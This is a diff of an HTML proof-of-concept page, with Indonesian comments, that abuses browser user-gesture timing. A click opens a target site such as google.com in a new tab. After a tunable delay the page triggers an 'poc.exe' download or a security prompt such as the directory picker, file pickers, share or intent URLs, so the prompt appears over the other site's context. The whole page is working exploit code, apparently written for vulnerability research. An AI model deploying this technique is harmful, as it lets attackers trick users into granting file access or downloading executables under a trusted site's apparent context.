@@ -1,49 +1,99 @@
 <!doctype html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Delayed Download After Tab Load (Best-effort)</title>
+<meta charset="utf-8">
+<title>Universal Delayed Security UI PoC</title>
 <style>
-  body { font-family: Arial, sans-serif; padding: 40px; }
-  button { padding: 14px 22px; font-size: 16px; }
-  #log { margin-top: 16px; font-size: 14px; color: #555; }
+  body {
+    font-family: system-ui, Arial, sans-serif;
+    padding: 40px;
+    background: #fafafa;
+  }
+  button {
+    padding: 14px 22px;
+    font-size: 16px;
+    cursor: pointer;
+  }
+  pre {
+    margin-top: 16px;
+    padding: 12px;
+    background: #f1f1f1;
+    border-radius: 6px;
+    font-size: 13px;
+    white-space: pre-wrap;
+  }
 </style>
 </head>
 <body>
 
-<h2>Delayed Download After New Tab Load</h2>
+<h2>Universal Delayed Security UI PoC</h2>
 <p>
-Klik tombol. Tab baru akan dibuka ke google.com.
-Setelah delay, download akan dipicu.
+1 klik → delay → context berubah → security UI muncul
 </p>
 
-<button id="run">Open Google → Delayed Download</button>
-<div id="log"></div>
+<button id="run">Run PoC</button>
+<pre id="log"></pre>
 
 <script>
-const log = (s) => document.getElementById('log').textContent += s + "\n";
+/* ==========================
+   CONFIGURATION
+========================== */
 
-document.getElementById("run").onclick = () => {
-  log("User clicked");
+// Ganti TARGET_URL sesuai kebutuhan
+const TARGET_URL = "https://www.google.com";
 
-  // 1) Buka tab baru (user gesture)
-  window.open("https://www.google.com", "_blank");
-  log("Opened new tab to google.com");
+// Delay (ms) — tweak per device/network
+const DELAY_MS = 2500;
 
-  // 2) Delay cukup lama agar google.com kemungkinan sudah load penuh
-  //    (Android Chrome: 1500–3000ms biasanya cukup)
-  setTimeout(() => {
-    log("Triggering download now");
+// Pilih SATU security-sensitive API di bawah
+async function triggerSecurityUI() {
 
-    // 3) Trigger download (masih dalam gesture chain di beberapa Chrome)
-    const a = document.createElement("a");
-    a.href = "data:application/octet-stream,TEST";
-    a.download = "poc.exe";
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
+  // === File System Access API ===
+  // await window.showSaveFilePicker({ suggestedName: "test.txt" });
 
-  }, 2500); // Coba 1500–3000ms
+  // await window.showOpenFilePicker();
+
+   await window.showDirectoryPicker();
+
+  // === Web Share API ===
+  // await navigator.share({ title: "Test", text: "Hello", url: "https://example.com" });
+
+  // === External Protocol / Intent ===
+  // location.href = "tel:123456789";
+  // location.href = "mailto:test@example.com";
+  // location.href = "geo:0,0?q=Jakarta";
+
+  // === Android Intent (Android Chrome only) ===
+  // location.href = "intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end";
+
+  // === Placeholder ===
+  alert("Replace triggerSecurityUI() with a real security-sensitive API");
+}
+
+/* ==========================
+   CORE LOGIC
+========================== */
+
+const logEl = document.getElementById("log");
+const log = (m) => logEl.textContent += m + "\n";
+
+document.getElementById("run").onclick = async () => {
+  log("[+] User gesture received");
+
+  // 1) Change visible context (tab switch / navigation)
+  window.open(TARGET_URL, "_blank");
+  log("[+] Opened target tab: " + TARGET_URL);
+
+  // 2) Async gap (attack window)
+  setTimeout(async () => {
+    log("[!] Triggering security-sensitive UI after delay");
+    try {
+      await triggerSecurityUI();
+      log("[+] UI triggered");
+    } catch (e) {
+      log("[-] UI canceled / blocked: " + e);
+    }
+  }, DELAY_MS);
 };
 </script>
 
